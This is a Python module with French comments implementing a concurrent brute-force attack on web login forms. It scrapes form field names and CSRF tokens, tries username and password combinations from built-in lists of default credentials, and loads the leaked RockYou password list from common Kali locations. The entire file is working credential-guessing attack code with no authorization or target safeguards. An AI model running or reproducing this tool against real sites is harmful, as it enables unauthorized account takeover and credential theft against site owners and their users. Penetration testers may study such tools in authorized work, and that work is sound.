#!/usr/bin/env python3
"""
Module de brute force pour pages de login
Supporte username/email seul, password seul, ou les deux simultanément
"""

import asyncio
import aiohttp
from typing import List, Dict, Optional
import time
import os
from pathlib import Path


async def login_bruteforce(
    url: str,
    username_list: Optional[List[str]] = None,
    password_list: Optional[List[str]] = None,
    username_param: str = "username",
    password_param: str = "password",
    success_indicator: Optional[str] = None,
    failure_indicator: Optional[str] = None,
    success_status: Optional[List[int]] = None,
    failure_status: Optional[List[int]] = None,
    max_concurrent: int = 10,
    timeout: int = 10,
    fixed_username: Optional[str] = None,
    fixed_password: Optional[str] = None
) -> List[Dict]:
    """
    Brute force une page de login
    
    Args:
        url: URL de la page de login
        username_list: Liste des usernames/emails à tester (None si pas de bruteforce username)
        password_list: Liste des mots de passe à tester (None si pas de bruteforce password)
        username_param: Nom du paramètre username dans le POST
        password_param: Nom du paramètre password dans le POST
        success_indicator: Indicateur de succès dans la réponse (substring)
        failure_indicator: Indicateur d'échec dans la réponse (substring)
        success_status: Codes HTTP de succès (ex: [200, 301, 302])
        failure_status: Codes HTTP d'échec (ex: [401, 403])
        max_concurrent: Nombre de requêtes concurrentes
        timeout: Timeout par requête en secondes
        fixed_username: Username fixe si bruteforce password seulement
        fixed_password: Password fixe si bruteforce username seulement
    
    Returns:
        Liste des credentials valides trouvés
    """
    
    valid_credentials = []
    
    # Valeurs par défaut pour les codes de statut
    if success_status is None:
        success_status = [200, 301, 302, 303, 307]
    if failure_status is None:
        failure_status = [401, 403]
    
    try:
        # Créer la session HTTP
        async with aiohttp.ClientSession() as session:
            semaphore = asyncio.Semaphore(max_concurrent)
            
            # Déterminer le mode de bruteforce
            if username_list and password_list:
                # Mode 1: Bruteforce username ET password
                tasks = []
                for username in username_list:
                    for password in password_list:
                        task = attempt_login(
                            session,
                            semaphore,
                            url,
                            username,
                            password,
                            username_param,
                            password_param,
                            success_indicator,
                            failure_indicator,
                            success_status,
                            failure_status,
                            timeout
                        )
                        tasks.append(task)
                
                results = await asyncio.gather(*tasks)
                valid_credentials = [r for r in results if r]
            
            elif username_list and not password_list and fixed_password:
                # Mode 2: Bruteforce username uniquement (password fixe)
                tasks = []
                for username in username_list:
                    task = attempt_login(
                        session,
                        semaphore,
                        url,
                        username,
                        fixed_password,
                        username_param,
                        password_param,
                        success_indicator,
                        failure_indicator,
                        success_status,
                        failure_status,
                        timeout
                    )
                    tasks.append(task)
                
                results = await asyncio.gather(*tasks)
                valid_credentials = [r for r in results if r]
            
            elif not username_list and password_list and fixed_username:
                # Mode 3: Bruteforce password uniquement (username fixe)
                tasks = []
                for password in password_list:
                    task = attempt_login(
                        session,
                        semaphore,
                        url,
                        fixed_username,
                        password,
                        username_param,
                        password_param,
                        success_indicator,
                        failure_indicator,
                        success_status,
                        failure_status,
                        timeout
                    )
                    tasks.append(task)
                
                results = await asyncio.gather(*tasks)
                valid_credentials = [r for r in results if r]
            
            else:
                return []
        
        return valid_credentials
    
    except Exception as e:
        print(f"Erreur bruteforce: {e}")
        return []


async def attempt_login(
    session: aiohttp.ClientSession,
    semaphore: asyncio.Semaphore,
    url: str,
    username: str,
    password: str,
    username_param: str,
    password_param: str,
    success_indicator: Optional[str],
    failure_indicator: Optional[str],
    success_status: List[int],
    failure_status: List[int],
    timeout: int
) -> Optional[Dict]:
    """
    Tente une combinaison username/password
    
    Returns:
        Dict avec credentials si succès, None sinon
    """
    async with semaphore:
        try:
            # Préparer les données POST
            data = {
                username_param: username,
                password_param: password
            }
            
            # Faire la requête
            async with session.post(
                url,
                data=data,
                timeout=aiohttp.ClientTimeout(total=timeout),
                allow_redirects=False
            ) as response:
                # Lire le contenu de la réponse
                content = await response.text()
                
                # Vérifier les indicateurs
                if success_indicator and success_indicator.lower() in content.lower():
                    return {
                        "username": username,
                        "password": password,
                        "status": response.status,
                        "url": url,
                        "method": "indicator"
                    }
                
                if failure_indicator and failure_indicator.lower() in content.lower():
                    return None
                
                # Vérifier les codes de statut
                if response.status in success_status:
                    # Si aucun indicateur d'échec, considérer comme succès potentiel
                    if not failure_indicator or failure_indicator.lower() not in content.lower():
                        return {
                            "username": username,
                            "password": password,
                            "status": response.status,
                            "url": url,
                            "method": "status_code"
                        }
                
                if response.status in failure_status:
                    return None
                
                # Si aucun indicateur clair, considérer comme échec pour sécurité
                return None
        
        except asyncio.TimeoutError:
            return None
        except Exception as e:
            return None
        finally:
            # Rate limiting: petit délai entre requêtes
            await asyncio.sleep(0.1)


async def smart_login_detection(url: str) -> Dict[str, str]:
    """
    Détecte automatiquement les paramètres de login et les indicateurs via scraping
    
    Args:
        url: URL de la page de login
    
    Returns:
        Dict avec les paramètres détectés
    """
    import aiohttp
    from bs4 import BeautifulSoup
    import re
    
    result = {
        "username_param": "username",
        "password_param": "password",
        "form_action": url,
        "form_method": "POST",
        "success_indicator": None,
        "failure_indicator": None,
        "csrf_token": None,
        "other_fields": {}
    }
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                if response.status != 200:
                    return result
                
                html_content = await response.text()
                soup = BeautifulSoup(html_content, 'html.parser')
                
                # Trouver le formulaire de login
                forms = soup.find_all('form')
                login_form = None
                
                for form in forms:
                    form_html = str(form).lower()
                    # Détecter si c'est un formulaire de login
                    if any(keyword in form_html for keyword in ['login', 'signin', 'auth', 'password', 'username', 'email']):
                        login_form = form
                        break
                
                if not login_form and forms:
                    # Prendre le premier formulaire si aucun login détecté
                    login_form = forms[0]
                
                if login_form:
                    # Détecter l'action du formulaire
                    form_action = login_form.get('action', '')
                    if form_action:
                        # Résoudre l'URL relative
                        from urllib.parse import urljoin
                        result["form_action"] = urljoin(url, form_action)
                    
                    result["form_method"] = login_form.get('method', 'POST').upper()
                    
                    # Trouver les champs username/email
                    username_fields = login_form.find_all(['input', 'textarea'], {
                        'type': ['text', 'email', None],
                        'name': re.compile(r'user|login|email|account|name', re.I)
                    })
                    
                    if not username_fields:
                        # Chercher par id
                        username_fields = login_form.find_all(['input', 'textarea'], {
                            'id': re.compile(r'user|login|email|account|name', re.I)
                        })
                    
                    if username_fields:
                        result["username_param"] = username_fields[0].get('name') or username_fields[0].get('id', 'username')
                    
                    # Trouver le champ password
                    password_fields = login_form.find_all('input', {'type': 'password'})
                    if password_fields:
                        result["password_param"] = password_fields[0].get('name') or password_fields[0].get('id', 'password')
                    
                    # Trouver les autres champs (CSRF, etc.)
                    all_inputs = login_form.find_all('input')
                    for inp in all_inputs:
                        inp_name = inp.get('name') or inp.get('id', '')
                        inp_type = inp.get('type', '').lower()
                        inp_value = inp.get('value', '')
                        
                        if inp_type == 'hidden':
                            if any(keyword in inp_name.lower() for keyword in ['csrf', 'token', '_token', 'authenticity']):
                                result["csrf_token"] = inp_value
                            else:
                                result["other_fields"][inp_name] = inp_value
                
                # Détecter les indicateurs de succès/échec dans la page
                page_text = soup.get_text().lower()
                
                # Indicateurs de succès communs
                success_patterns = [
                    r'welcome|success|logged in|dashboard|profile|account|logout',
                    r'redirect|location\.href|window\.location'
                ]
                
                # Indicateurs d'échec communs
                failure_patterns = [
                    r'invalid|incorrect|wrong|failed|error|denied|unauthorized|forbidden',
                    r'username.*password|password.*username|credentials'
                ]
                
                # Chercher dans le JavaScript aussi
                scripts = soup.find_all('script')
                js_content = ' '.join([script.string or '' for script in scripts]).lower()
                
                # Détecter les messages d'erreur typiques
                if any(re.search(pattern, page_text) for pattern in failure_patterns):
                    result["failure_indicator"] = "error message detected"
                
                # Détecter les redirections de succès
                if 'redirect' in js_content or 'location.href' in js_content:
                    result["success_indicator"] = "redirect detected"
                
    except Exception as e:
        # En cas d'erreur, retourner les valeurs par défaut
        pass
    
    return result


def generate_common_usernames(domain: str = None) -> List[str]:
    """
    Génère une liste d'usernames communs
    
    Args:
        domain: Domaine pour générer des emails si nécessaire
    
    Returns:
        Liste d'usernames
    """
    usernames = [
        "admin", "administrator", "root", "test", "demo",
        "user", "guest", "support", "info", "webmaster",
        "manager", "operator", "service", "api", "system",
        "operator", "backup", "mail", "ftp", "www"
    ]
    
    # Ajouter des emails si domaine fourni
    if domain:
        emails = [f"{u}@{domain}" for u in usernames[:10]]  # Limiter pour éviter trop de combinaisons
        usernames.extend(emails)
    
    return usernames


def generate_common_passwords() -> List[str]:
    """
    Génère une liste de mots de passe communs
    
    Returns:
        Liste de mots de passe
    """
    passwords = [
        "admin", "password", "123456", "password123", "admin123",
        "root", "123456789", "1234", "qwerty", "abc123",
        "password1", "Password1", "Welcome123", "Password123",
        "admin@123", "Admin@123", "welcome", "default", "letmein",
        "master", "monkey", "login", "passw0rd", "qwerty123"
    ]
    
    return passwords


def load_wordlist_from_file(filename: str) -> List[str]:
    """
    Charge une wordlist depuis un fichier
    
    Args:
        filename: Chemin vers le fichier
    
    Returns:
        Liste des mots du fichier
    """
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Erreur lecture wordlist: {e}")
        return []


def find_rockyou_wordlist() -> Optional[str]:
    """
    Trouve le fichier rockyou.txt dans les emplacements communs
    
    Returns:
        Chemin vers rockyou.txt ou None si introuvable
    """
    # Emplacements communs pour rockyou.txt
    common_locations = [
        "/usr/share/wordlists/rockyou.txt",  # Kali Linux
        "/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz",  # SecLists
        "/usr/share/wordlists/rockyou.txt.gz",  # Kali (compressé)
        str(Path.home() / "wordlists" / "rockyou.txt"),
        str(Path.home() / "Downloads" / "rockyou.txt"),
        "/opt/wordlists/rockyou.txt",
        "rockyou.txt"  # Dans le répertoire courant
    ]
    
    # Essayer de trouver rockyou.txt
    for location in common_locations:
        if os.path.exists(location):
            return location
    
    # Essayer aussi rockyou.txt.gz et décompresser
    for location in common_locations:
        if location.endswith('.gz') and os.path.exists(location):
            # On retourne quand même car Python peut lire les .gz
            return location
    
    return None


def load_rockyou_wordlist(limit: Optional[int] = None) -> List[str]:
    """
    Charge la wordlist RockYou (leaked passwords)
    
    Args:
        limit: Limiter le nombre de mots de passe chargés (utile pour tests rapides)
    
    Returns:
        Liste de mots de passe de RockYou
    """
    rockyou_path = find_rockyou_wordlist()
    
    if not rockyou_path:
        print("RockYou non trouvé. Essayez d'installer: apt install wordlists")
        return []
    
    try:
        # Vérifier si c'est un fichier compressé
        if rockyou_path.endswith('.gz'):
            import gzip
            with gzip.open(rockyou_path, 'rt', encoding='utf-8', errors='ignore') as f:
                if limit:
                    return [line.strip() for i, line in enumerate(f) if line.strip() and i < limit]
                return [line.strip() for line in f if line.strip()]
        else:
            with open(rockyou_path, 'r', encoding='utf-8', errors='ignore') as f:
                if limit:
                    return [line.strip() for i, line in enumerate(f) if line.strip() and i < limit]
                return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Erreur chargement RockYou: {e}")
        return []
